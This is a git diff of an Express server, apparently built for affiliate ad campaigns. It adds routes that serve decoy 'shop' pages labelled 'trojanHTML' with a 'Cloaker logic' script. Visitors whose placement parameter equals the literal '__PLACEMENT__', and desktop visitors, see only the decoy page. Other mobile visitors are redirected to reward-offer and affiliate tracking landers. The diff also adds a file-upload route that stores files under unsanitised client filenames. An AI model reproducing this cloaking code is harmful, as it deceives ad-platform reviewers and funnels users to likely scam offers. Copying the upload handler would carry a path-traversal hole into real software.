@@ -2,15 +2,16 @@ const express = require('express');
 const app = express();
 const path = require('path');
 const fs = require('fs');
-const WebSocket = require('uws.js');
+const multer = require('multer');
+const xlsx = require('xlsx');
 
 // Serve static files from the public directory
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Middleware to handle requests to /:offer/:slug
-app.get('/:offer/:slug', (req, res, next) => {
+// Middleware to pass on Tyler's SubIDs MY LANDER
+app.get('/twshein/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
-    const destinationLander = `https://rewards-for-all.com/${offer}.html`;
+    const destinationLander = `https://tok-reward.com/twshein.html?sub=${slug}`;
     const trojanHTML = `
         <!DOCTYPE html>
         <html lang="en">
@@ -31,7 +32,172 @@ app.get('/:offer/:slug', (req, res, next) => {
             <title>${slug}</title>
         </head>
         <body>
-            <h1>Welcome to our Store!</h1>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served twshein Trojan (tyler)(${slug})`);
+});
+
+// Middleware to pass on Tyler's SubIDs IMAGE LANDER
+app.get('/twsheinimg/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const destinationLander = `https://tok-reward.com/twsheinimg.html?sub=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served twsheinimg Trojan (tyler)(${slug})`);
+});
+
+// Middleware to pass on Tyler's SubIDs DIRECT
+app.get('/twsheindir/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const destinationLander = `https://t.afftrackr.com/?oex3=qyKG87QeFmGbK3xz5A7M2qxsKXSq%2F5iYvQJDRoz7h5U%3D&s1=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served twsheindir Trojan (tyler)(${slug})`);
+});
+
+// Middleware to pass on my slug values to MaxConv (SHEIN TESTING CAMP)
+app.get('/shein/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://klcxb6.mcgo2.com/visit/1cc3f21b-9970-4cf1-98d6-2105066f060d?slug=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
+});
+
+// Middleware to pass on my slug values to MaxConv (SEPHORA CAMP)
+app.get('/sephora/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://klcxb6.mcgo2.com/visit/d198df7c-4379-4818-9f7c-ea8e2a34cf6a?slug=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
+});
+
+// Middleware to handle requests to /:offer/:slug
+app.get('/:offer/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const destinationLander = `https://tok-reward.com/${offer}.html`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to the ${slug} WebShop!</h1>
             <p>You are shopping at: ${slug}</p>
         </body>
         </html>
@@ -40,38 +206,48 @@ app.get('/:offer/:slug', (req, res, next) => {
             console.log(`Served ${offer} Trojan (${slug})`);
 });
 
+// IMPORT/EXPORT App
+
+// Set up multer for handling file uploads
+const storage = multer.diskStorage({
+  destination: function (req, file, cb) {
+    cb(null, 'uploads/');
+  },
+  filename: function (req, file, cb) {
+    cb(null, file.originalname);
+  }
+});
+const upload = multer({ storage: storage });
+
+// Route for handling file uploads
+app.post('/upload', upload.single('uploadedFile'), (req, res) => {
+  // Read the uploaded file
+  const workbook = xlsx.readFile(req.file.path);
+  const sheetName = workbook.SheetNames[0];
+  const worksheet = workbook.Sheets[sheetName];
+
+  // Modify the data in the worksheet as needed
+  // For example, changing cell A1 to 'Hello World'
+  worksheet.A1.v = 'Hello World';
+
+  // Write the modified workbook to a new file
+  const outputPath = `modified_${req.file.originalname}`;
+  xlsx.writeFile(workbook, outputPath);
+
+  // Send the modified file as a response
+  res.download(outputPath, (err) => {
+    // Delete the modified file after it has been sent
+    fs.unlink(outputPath, (err) => {
+      if (err) {
+        console.error('Error deleting file:', err);
+      }
+    });
+  });
+});
+
 // Start the HTTP server
 const PORT = 8080;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
 
-
-
-// DASHBOARD
-const wsServer = new WebSocket.Server({ port: 8081 });
-
-function sendToClients(message) {
-    wsServer.clients.forEach(client => {
-        if (client.readyState === WebSocket.OPEN) {
-            client.send(message);
-        }
-    });
-}
-
-// Intercept console.log and redirect to WebSocket clients
-const originalLog = console.log;
-console.log = function(...args) {
-    const message = args.join(' ');
-    sendToClients(message);
-    originalLog(...args);
-};
-
-// WebSocket connection handling
-wsServer.on('connection', ws => {
-    console.log('Client connected.');
-    
-    ws.on('close', () => {
-        console.log('Client disconnected.');
-    });
-});
